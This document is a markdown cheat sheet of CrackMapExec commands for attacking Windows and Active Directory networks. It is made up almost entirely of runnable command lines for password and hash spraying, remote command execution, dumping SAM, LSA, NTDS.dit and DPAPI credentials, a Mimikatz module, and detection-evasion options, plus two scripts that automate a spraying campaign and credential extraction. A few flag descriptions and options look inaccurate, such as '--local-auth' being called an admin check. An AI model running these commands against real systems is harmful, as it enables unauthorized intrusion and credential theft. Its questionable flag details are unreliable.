# CrackMapExec - Network Service Enumeration and Exploitation

Advanced tool for penetration testing Windows/Active Directory environments with protocol support for SMB, HTTP, SSH, WinRM, and more.

## Installation

```bash
# Python pip installation
pip install crackmapexec

# Ubuntu/Debian
apt install crackmapexec

# From source
git clone https://github.com/byt3bl33d3r/CrackMapExec
cd CrackMapExec
python setup.py install

# Docker
docker run -it --rm crackmapexec:latest
```

## Basic SMB Enumeration

```bash
# Host discovery
crackmapexec smb 192.168.1.0/24

# Single host scan
crackmapexec smb 192.168.1.100

# Null session enumeration
crackmapexec smb 192.168.1.100 -u '' -p ''

# Guest account access
crackmapexec smb 192.168.1.100 -u 'guest' -p ''
```

## Authentication Testing

```bash
# Single credential test
crackmapexec smb 192.168.1.100 -u administrator -p password123

# Password spraying
crackmapexec smb 192.168.1.0/24 -u administrator -p password123

# Multiple usernames
crackmapexec smb 192.168.1.100 -u users.txt -p password123

# Multiple passwords
crackmapexec smb 192.168.1.100 -u administrator -p passwords.txt

# Credential combinations
crackmapexec smb 192.168.1.100 -u users.txt -p passwords.txt
```

## Hash Authentication

```bash
# NTLM hash authentication
crackmapexec smb 192.168.1.100 -u administrator -H 'LM:NTLM'

# NT hash only
crackmapexec smb 192.168.1.100 -u administrator -H 'NTHASH'

# Hash spraying
crackmapexec smb 192.168.1.0/24 -u administrator -H 'NTHASH'
```

## Domain Enumeration

```bash
# Domain information
crackmapexec smb 192.168.1.100 -u username -p password --shares

# User enumeration
crackmapexec smb 192.168.1.100 -u username -p password --users

# Group enumeration  
crackmapexec smb 192.168.1.100 -u username -p password --groups

# Local admin check
crackmapexec smb 192.168.1.100 -u username -p password --local-auth
```

## Command Execution

```bash
# Execute single command
crackmapexec smb 192.168.1.100 -u administrator -p password -x "whoami"

# PowerShell execution
crackmapexec smb 192.168.1.100 -u administrator -p password -X "Get-Process"

# Execute on multiple hosts
crackmapexec smb 192.168.1.0/24 -u administrator -p password -x "hostname"
```

## File Operations

```bash
# List shares
crackmapexec smb 192.168.1.100 -u username -p password --shares

# Access specific share
crackmapexec smb 192.168.1.100 -u username -p password --share C$

# Upload file
crackmapexec smb 192.168.1.100 -u username -p password --put-file /local/file.txt C:\\temp\\file.txt

# Download file
crackmapexec smb 192.168.1.100 -u username -p password --get-file C:\\temp\\file.txt /local/file.txt
```

## Credential Harvesting

```bash
# SAM database dump
crackmapexec smb 192.168.1.100 -u administrator -p password --sam

# LSA secrets
crackmapexec smb 192.168.1.100 -u administrator -p password --lsa

# NTDS.dit dump
crackmapexec smb 192.168.1.100 -u administrator -p password --ntds

# Cached credentials
crackmapexec smb 192.168.1.100 -u administrator -p password --dpapi
```

## WinRM Protocol

```bash
# WinRM enumeration
crackmapexec winrm 192.168.1.100 -u username -p password

# Command execution via WinRM
crackmapexec winrm 192.168.1.100 -u username -p password -x "Get-ComputerInfo"

# PowerShell via WinRM
crackmapexec winrm 192.168.1.100 -u username -p password -X "Get-Process | Select-Object Name"
```

## SSH Protocol

```bash
# SSH authentication test
crackmapexec ssh 192.168.1.100 -u root -p password

# SSH key authentication
crackmapexec ssh 192.168.1.100 -u root --key-file /path/to/key

# Command execution via SSH
crackmapexec ssh 192.168.1.100 -u root -p password -x "uname -a"
```

## Database Enumeration

```bash
# MSSQL enumeration
crackmapexec mssql 192.168.1.100 -u sa -p password

# MySQL enumeration  
crackmapexec mysql 192.168.1.100 -u root -p password

# Database query execution
crackmapexec mssql 192.168.1.100 -u sa -p password -q "SELECT @@version"
```

## Advanced Modules

```bash
# Available modules
crackmapexec smb 192.168.1.100 --list-modules

# Mimikatz module
crackmapexec smb 192.168.1.100 -u administrator -p password -M mimikatz

# Bloodhound module
crackmapexec smb 192.168.1.100 -u username -p password -M bloodhound-py

# Empire module
crackmapexec smb 192.168.1.100 -u username -p password -M empire_launcher
```

## Evasion Techniques

```bash
# Random delay between requests
crackmapexec smb 192.168.1.0/24 -u username -p password --delay 5

# Connection jitter
crackmapexec smb 192.168.1.0/24 -u username -p password --jitter 10

# Custom user agent
crackmapexec http 192.168.1.100 -u username -p password --user-agent "Mozilla/5.0"

# Protocol timeout
crackmapexec smb 192.168.1.100 -u username -p password --timeout 30
```

## Output Options

```bash
# Verbose output
crackmapexec smb 192.168.1.100 -u username -p password -v

# Save successful credentials
crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt --continue-on-success

# Log to file
crackmapexec smb 192.168.1.0/24 -u username -p password --log logfile.txt

# JSON output
crackmapexec smb 192.168.1.100 -u username -p password --json
```

## Database Integration

```bash
# Initialize database
cmedb

# View collected data
cmedb> hosts
cmedb> creds
cmedb> shares

# Export data
cmedb> export shares csv /path/to/shares.csv
cmedb> export hosts csv /path/to/hosts.csv
```

## Automated Workflows

### Domain assessment script
```bash
#!/bin/bash
TARGET_RANGE="192.168.1.0/24"
USERNAME="administrator"
PASSWORD="password123"

echo "Starting domain assessment..."

# Host discovery
crackmapexec smb $TARGET_RANGE

# Authentication test
crackmapexec smb $TARGET_RANGE -u $USERNAME -p $PASSWORD

# Enumerate shares on compromised hosts
crackmapexec smb $TARGET_RANGE -u $USERNAME -p $PASSWORD --shares

# Credential extraction
crackmapexec smb $TARGET_RANGE -u $USERNAME -p $PASSWORD --sam
```

### Password spraying campaign
```bash
#!/bin/bash
TARGETS="targets.txt"
PASSWORDS="common_passwords.txt"
USERNAME="administrator"

for password in $(cat $PASSWORDS); do
    echo "Testing password: $password"
    crackmapexec smb $TARGETS -u $USERNAME -p "$password" --continue-on-success
    sleep 30  # Avoid lockouts
done
```

Essential tool for Active Directory penetration testing and Windows network assessment.
